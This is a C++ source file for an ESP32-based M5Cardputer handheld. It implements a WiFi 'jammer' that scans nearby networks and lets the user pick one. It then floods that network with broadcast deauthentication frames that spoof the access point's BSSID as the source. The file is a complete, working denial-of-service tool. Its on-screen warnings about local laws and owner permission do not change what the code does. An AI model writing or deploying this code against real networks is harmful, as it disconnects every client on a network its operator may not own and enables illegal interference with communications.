#include <Arduino.h>
#include <M5Cardputer.h>
#include <vector>
#include <array>
#include <map>
#include <set>
#include <WiFi.h>
#include <esp_wifi.h>

#include "utils.h"
#include "config.h"
#include "apps.h"

void jammer() {
   std::map<String, std::array<int, 2>> WiFis;
   std::vector<String> available = {"|-exit-|"};

   debounceKeyboard();
   scrollTextArr({
      "Jamming may be illegal in some regions",
      "be sure to consult your local laws",
      "do not use without permission of the network owner",
      "do not use it to cause chaos",
      "press opt continue",
   }, true);

   info("scanning");

   int n = WiFi.scanNetworks();
   for (int i = 0; i < n; i++) {
      WiFis[WiFi.SSID(i)] = {WiFi.channel(i), i};
      available.push_back(WiFi.SSID(i));
   }

   const String selectedNetwork = scrollTextArrHighlight(available, false, SEC_FONT_COLOR, PRIM_FONT_COLOR);
   if (selectedNetwork == "|-exit-|") {
      return;
   }
   const int networkChan = WiFis[selectedNetwork][0];
   const int networkN = WiFis[selectedNetwork][1];
   const uint8_t * bssid = WiFi.BSSID(networkN);

   info("setting up");
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
   delay(100);

   esp_wifi_set_channel(networkChan, WIFI_SECOND_CHAN_NONE);

   uint8_t deauth_packet[26] = {
      0xC0, 0x00, // Frame Control: Deauthentication
      0x00, 0x00, // Duration
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: Spoofed (will be set)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: Target AP
      0x00, 0x00, // Sequence number
      0x02, 0x00  // Reason code
   };


   memcpy(&deauth_packet[10], bssid, 6);
   memcpy(&deauth_packet[16], bssid, 6);


   int packetsSent = 0;
   M5Cardputer.Lcd.setTextColor(SEC_FONT_COLOR);
   M5Cardputer.Lcd.setTextSize(SEC_FONT_SIZE);
   M5Cardputer.Lcd.fillScreen(TFT_BLACK);
   M5Cardputer.Lcd.drawString("Jamming", 10, 10);
   M5Cardputer.Lcd.drawString("Press opt to exit", 10, 20);
   M5Cardputer.Lcd.drawString("Sent packets: ", 10, 40);

   const int textSize = M5Cardputer.Lcd.fontWidth()*14;

   while (true) {
      M5Cardputer.update();
      if (M5Cardputer.Keyboard.isPressed()) {
         const auto status = M5Cardputer.Keyboard.keysState();
         if (status.opt) return;
      }

      esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
      packetsSent++;
      M5Cardputer.Lcd.fillRect(textSize, 40, 100, 20, TFT_BLACK);
      M5Cardputer.Lcd.drawString(String(packetsSent), textSize, 40);
   }




}